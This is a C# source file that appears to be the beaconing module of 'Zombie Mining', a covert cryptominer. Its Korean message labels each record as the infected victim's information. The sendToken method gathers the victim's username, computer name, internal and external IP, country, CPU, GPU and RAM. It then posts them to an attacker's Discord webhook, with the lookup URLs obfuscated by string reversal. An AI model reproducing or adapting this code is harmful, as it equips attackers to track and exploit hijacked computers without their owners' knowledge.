using System;
using System.Management;
using System.Net;
using System.Windows.Forms;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Linq;
using System.Collections.Specialized;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Threading;
using System.Text;
using System.Data;
using Newtonsoft.Json;

namespace ITB
{
	class Send
	{
		private static string[] array;
		private static string now;
		private static string now2;
		private static ManagementObjectSearcher win32Proc = new ManagementObjectSearcher("select * from Win32_Processor");
		private static ManagementObjectSearcher win32Display = new ManagementObjectSearcher("select * from Win32_DIsplayCOnfiguration");
		private static ManagementObjectSearcher win32CompSys = new ManagementObjectSearcher("select * from Win32_ComputerSystem");
		private static string procName = "";
		private static string grpName = "";
		private static string memName = "";
		private static string mess = "";

		public static void sendHook(string hook, string mess)
		{
			using (dWebHook dcWeb = new dWebHook())
			{
				dcWeb.ProfilePicture = Pack.Reverse("gnp.jr-on-ffffff00x0c-k-c-009st2vWEi_H4NQJocBPpn37Dq43Uwn1ZADlI4CLMQLOdeKA/038659641190784588/823141771186584588/stnemhcatta/moc.ppadrocsid.ndc//:sptth");
				dcWeb.UserName = Pack.Reverse("1000#잡만미땁에! yb edaM gniniM eibmoZ");
				dcWeb.WebHook = hook;
				dcWeb.SendMessage(mess);
			}
		}

		public static void setInfo()
		{
			foreach (ManagementObject obj in Send.win32Proc.Get())
			{
				Send.procName = obj["Name"].ToString();
			}
			foreach (ManagementObject obj in Send.win32Display.Get())
			{
				Send.grpName = obj["Description"].ToString();
			}
			foreach (ManagementObject obj in Send.win32CompSys.Get())
			{
				Send.memName = obj["totalphysicalmemory"].ToString();
			}
		}
		public static void sendToken(string hook)
		{
			try
			{

					array = new WebClient
					{
						Proxy = null
					}.DownloadString(Pack.Reverse("nosj/moc.piymsiftw//:sptth")).Split(new char[] { '"' });
				mess = "**`#좀비체굴이 시작되었습니다 감염자 정보입니다!`**\n\n**PC Information**\n```css\n[ + ] 사용자 이름: " + (System.Security.Principal.WindowsIdentity.GetCurrent().Name).Split('\\')[1] + "\n[ + ] PC 이름: " + SystemInformation.ComputerName + "\n[ + ] 내부IP: " + Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString() + "\n[ + ] 외부IP: " + array[3] + "\n[ + ] 국가: " + array[21] + "```\n\n**PC Specs**\n```\n[ + ] CPU: " + Send.procName + "\n[ + ] GPU: " + Send.grpName + "\n[ + ] RAM ID: " + Send.memName + "```\n**__Made By ! 에땁마만잡#0001__**\n";
				now2 = mess;

			}
			catch { return; }

			if (now == now2)
			{
				return;
			}
			else
			{
				now = now2;
				sendHook(hook, mess);
				return;
			}

		}
	}
}
